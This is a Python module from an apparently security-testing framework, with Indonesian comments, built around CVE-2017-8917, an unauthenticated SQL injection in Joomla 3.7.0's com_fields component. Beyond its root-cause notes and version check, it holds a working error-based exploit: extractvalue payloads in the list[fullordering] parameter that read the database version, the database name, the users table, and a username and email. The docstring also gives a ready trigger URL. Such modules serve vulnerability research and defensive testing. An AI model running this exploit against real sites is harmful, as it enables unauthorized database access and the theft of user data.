#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2017-8917 — com_fields: SQL injection tanpa autentikasi lewat parameter
                `list[fullordering]` (klausa ORDER BY).

Affected : 3.7.0 (satu-satunya rilis rentan)
Patched  : 3.7.1+

ROOT CAUSE — administrator/components/com_fields/models/fields.php::getListQuery()

    3.7.0 (VULNERABLE)
        $listOrdering = $this->getState('list.fullordering', 'a.ordering');
        $orderDirn    = '';
        if (empty($listOrdering)) {
            $listOrdering  = $this->state->get('list.ordering', 'a.ordering');
            $orderDirn     = $this->state->get('list.direction', 'DESC');
        }
        $query->order($db->escape($listOrdering) . ' ' . $db->escape($orderDirn));

    3.7.1 (PATCHED)
        // Implement View Level Access — filter juga berlaku utk klien non-admin
        if (!$app->isClient('administrator') || !$user->authorise('core.admin'))
        ...
        $listOrdering  = $this->state->get('list.ordering', 'a.ordering');
        $orderDirn     = $this->state->get('list.direction', 'DESC');
        $query->order($db->escape($listOrdering) . ' ' . $db->escape($orderDirn));

`list.fullordering` menerima satu string gabungan ("ordering arah") yang lalu
dimasukkan ke klausa ORDER BY. `$db->escape()` hanya meng-escape tanda kutip —
pada ORDER BY nilai tidak dibungkus kutip, jadi escaping tidak menahan apa pun:
klien bebas menempelkan ekspresi SQL.

Jangkauan unauth: frontend mengirim `view=fields`, dan `JControllerLegacy::getView()`
mencari view di JPATH_COMPONENT **dan** JPATH_COMPONENT_ADMINISTRATOR. Karena
`components/com_fields/views/` tidak ada di sisi situs, view + layout `modal`
diambil dari direktori administrator, dan model yang dipakai adalah
`FieldsModelFields` — model admin yang sama. Tanpa login, `list[fullordering]`
dari query string sampai ke klausa ORDER BY.

Dampak: SQL injection error-based (MySQL `extractvalue`/`updatexml`) tanpa
autentikasi — baca isi basis data (versi, nama DB, kredensial pengguna).
CWE-89.

Dipicu tanpa kredensial:
    GET /index.php?option=com_fields&view=fields&layout=modal
        &list[fullordering]=extractvalue(1,concat(0x7e,version()))

Bukti lab (build asli):
    3.7.0 : HTTP 500, "XPATH syntax error: '~8.0.46'"      -> VULN
    3.7.1 : HTTP 303, tanpa pesan SQL                      -> CLEAN
"""

import re
from urllib.parse import quote

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN,
                ST_VULN, detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
BASE_URL = "/index.php?option=com_fields&view=fields&layout=modal"

VULN_VER = (3, 7, 0)          # diperkenalkan sekaligus satu-satunya rilis rentan

# Penanda pesan error MySQL yang membuktikan ekspresi kita benar-benar dieksekusi.
ERR_MARKERS = ("XPATH syntax error", "SQL syntax", "mysql_fetch", "mysqli_sql_exception")
MARK = "~"                    # pembatas nilai di dalam pesan error extractvalue


def _joomla_version(t, h):
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] != 3:
        return False
    return ver_le(ver, VULN_VER) and ver >= (3, 7, 0)


def _sqli_expr(expr):
    """
    Bungkus ekspresi SQL menjadi payload `fullordering`.
    extractvalue() memicu error yang memuat hasil ekspresi (dibatasi 32 karakter).
    """
    payload = f"extractvalue(1,concat(0x7e,({expr}),0x7e))"
    return (f"{BASE_URL}&" + quote("list[fullordering]", safe="") + "=" + quote(payload, safe=""))


def _send(h, t, expr):
    r = h.get(f"{t.url}{_sqli_expr(expr)}")
    if r is None:
        return None, ""
    return r.status_code, (r.text or "")


def _extract(h, t, expr):
    """
    Jalankan ekspresi lewat injeksi dan kembalikan nilai di antara penanda MARK.
    MySQL memotong nilai di pesan error pada 32 karakter, sehingga penanda penutup
    sering hilang -> nilai diambil sampai MARK berikutnya ATAU sampai kutip penutup.
    Kembalikan (status, nilai|None, body).
    """
    status, body = _send(h, t, expr)
    if status is None:
        return None, None, ""
    plain = _unescape(body)
    m = re.search(re.escape(MARK) + r"([^" + re.escape(MARK) + r"']{1,64})", plain)
    if m:
        return status, m.group(1).strip(), plain
    return status, None, plain


def _unescape(s):
    for a, b in (("&#039;", "'"), ("&quot;", '"'), ("&lt;", "<"), ("&gt;", ">"),
                 ("&amp;", "&")):
        s = s.replace(a, b)
    return s.strip()


def _sql_error(status, body):
    return any(mk in body for mk in ERR_MARKERS)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"

    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (3.7.0)", f"version={ver_s}"

    status, val, body = _extract(h, t, "version()")
    ev = f"GET {BASE_URL}&list[fullordering]=extractvalue(...) HTTP {status}"
    if status is None:
        return ST_UNKNOWN, "endpoint com_fields tidak dapat dihubungi", f"version={ver_s}"
    if val:
        return (ST_INFO,
                f"Joomla {ver_s} — SQLi unauth di list[fullordering] (error-based, "
                f"versi DB terbaca: {val})",
                f"version={ver_s} | {ev} | db_version={val}")
    if _sql_error(status, body):
        return ST_INFO, f"Joomla {ver_s} — error SQL terpicu (injection jalan)", \
                        f"version={ver_s} | {ev}"
    if status in (301, 302, 303):
        return ST_CLEAN, f"Joomla {ver_s} — parameter diabaikan (redirect {status})", \
                         f"version={ver_s} | {ev}"
    return ST_INFO, f"Joomla {ver_s} — endpoint merespons tanpa jejak injeksi (HTTP {status})", \
                    f"version={ver_s} | {ev}"


def exploit(t, h, opts):
    """
    Konfirmasi dampak: buktikan ekspresi SQL klien dieksekusi, lalu baca metadata
    pengguna dari basis data tanpa kredensial (nilai dibatasi 32 char oleh MySQL).
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (3.7.0)", f"version={ver_s}"

    status, dbver, _ = _extract(h, t, "version()")
    if status is None:
        return ST_UNKNOWN, "endpoint com_fields tidak dapat dihubungi", f"version={ver_s}"
    if not dbver:
        if status in (301, 302, 303):
            return ST_CLEAN, f"Joomla {ver_s} — injeksi tidak diterima (redirect {status})", \
                             f"version={ver_s}"
        return ST_UNKNOWN, f"ekspresi SQL tidak tereksekusi (HTTP {status})", \
                           f"version={ver_s}"

    ev = [f"version={ver_s}", f"db_version={dbver}"]

    st, dbname, _ = _extract(h, t, "database()")
    if dbname:
        ev.append(f"db={dbname}")

    # tabel pengguna (prefix tidak diasumsikan): cari lewat information_schema
    tbl = None
    st, tblname, _ = _extract(
        h, t,
        "SELECT table_name FROM information_schema.tables "
        "WHERE table_schema=database() AND table_name LIKE 0x257573657273 LIMIT 1")
    if tblname and re.fullmatch(r"[A-Za-z0-9_]+", tblname):
        tbl = tblname
        ev.append(f"user_table={tbl}")

    user_row = None
    if tbl:
        st, uname, _ = _extract(h, t, f"SELECT username FROM {tbl} LIMIT 1")
        st2, umail, _ = _extract(h, t, f"SELECT email FROM {tbl} LIMIT 1")
        if uname:
            user_row = uname + (":" + umail if umail else "")
            ev.append(f"user_row={user_row}")

    if user_row:
        return (ST_PWN,
                f"SQLi unauth terbukti & data pengguna terbaca (Joomla {ver_s}): "
                f"{user_row}",
                " | ".join(ev))
    return (ST_PWN,
            f"SQLi unauth terbukti — ekspresi SQL klien dieksekusi (Joomla {ver_s}); "
            f"versi DB {dbver}",
            " | ".join(ev))


register(CveModule(
    cve="CVE-2017-8917",
    cluster="joomla_core",
    title="Joomla Core - com_fields unauth SQL injection via list[fullordering]",
    vclass="sql injection",
    cvss="9.8",
    severity="critical",
    cwe="CWE-89",
    product="Joomla! Core (com_fields, FieldsModelFields::getListQuery)",
    versions_affected="3.7.0",
    status="verified",
    requires=[
        "tidak butuh kredensial (vektor unauth)",
        "komponen com_fields aktif (bawaan sejak 3.7.0)",
    ],
    check=check,
    exploit=exploit,
    notes=("3.7.0 membaca $this->getState('list.fullordering') lalu memasukkannya ke "
           "$query->order($db->escape($listOrdering) . ' ' . $db->escape($orderDirn)); "
           "$db->escape hanya meng-escape kutip, dan klausa ORDER BY tidak memakai kutip "
           "-> ekspresi SQL klien dieksekusi. 3.7.1 berhenti membaca list.fullordering "
           "dan menambah filter view-level utk klien non-admin. Jangkauan unauth lewat "
           "frontend karena JControllerLegacy::getView() juga mencari view di "
           "JPATH_COMPONENT_ADMINISTRATOR sehingga view+layout modal admin dipakai. "
           "Diverifikasi di build asli: 3.7.0 -> HTTP 500 'XPATH syntax error: ~8.0.46'; "
           "3.7.1 -> HTTP 303 tanpa error. Lab: mp-j370 @8115 (rentan) vs mp-j371 @8116. "
           "Nilai yang diekstrak dibatasi 32 karakter oleh pesan error MySQL."),
))
